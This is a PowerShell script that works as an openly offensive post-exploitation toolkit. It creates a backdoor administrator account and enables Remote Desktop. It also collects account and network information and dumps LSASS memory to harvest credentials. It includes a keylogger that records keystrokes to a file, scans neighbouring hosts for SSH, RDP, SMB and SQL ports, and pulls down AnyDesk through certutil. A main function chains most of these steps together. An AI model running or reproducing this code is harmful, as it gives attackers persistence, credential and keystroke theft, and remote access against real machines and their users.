
function gs1{
    $pw = ConvertTo-SecureString "mustbeSick!" -AsPlainText -Force
    $set = @{Name='jadmin'
        Password=$pw
        Description='jeff admin acc'}
    New-LocalUser @set
    Add-LocalGroupMember -Group "Administrators" -Member "jadmin"
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}



function ks1{
    mkdir c:\temp\2exfil
    $dog = "c:\temp\2exfil\AccountInfo.txt"
    $dog2 = "c:\temp\2exfil\NetworkInfo.txt"
    net user >> $dog
    net localgroup >> $dog
    net group >> $dog
    net use >> $dog
    net share >> $dog  
    net view >> $dog
    net accounts >> $dog
    Netstat -a >> $dog2
    $P = get-process lsass |select -expand id
    C:\windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll MiniDump $P c:\temp\2exfil\dump.txt full
}

function ks2($Path="C:\temp\2exfil"){
  # Signatures for API Calls
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    # open logger file in Notepad
    notepad $Path
  }
}

function js2{
    $arpTable = arp -a
    $ipAddresses = $arpTable | Where-Object { $_ -match "\d+\.\d+\.\d+\.\d+" } | ForEach-Object {
        if ($_ -match "\d+\.\d+\.\d+\.\d+") {
            $matches[0]
        }
    }
    # Define the ports to scan
    $ports = @(22, 3389, 445, 1433)
    # Output file path
    $outputFile = "C:\Users\Public\aliveresults.txt"
    # Ensure output file is clear before starting
    if (Test-Path $outputFile) {
        Remove-Item $outputFile
    }
    # Scan each IP on each port
    foreach ($ip in $ipAddresses) {
        foreach ($port in $ports) {
            $result = Test-NetConnection -ComputerName $ip -Port $port -WarningAction SilentlyContinue -InformationLevel Quiet
            if ($result.TcpTestSucceeded) {
                $output = "Port $port on $ip is open."
            } else {
                $output = "Port $port on $ip is closed."
            }
            Write-Output $output | Out-File -FilePath $outputFile -Append -Encoding ASCII
            Write-Output $output
        }
    }
}

function js3{
    certutil.exe -urlcache -split -f http://download.anydesk.com/AnyDesk.exe C:\temp\AnyDesk.exe
    Remove-Item C:\temp\AnyDesk.exe
}






function main{
    gs1
    ks1
    js3
    ks2
}
main
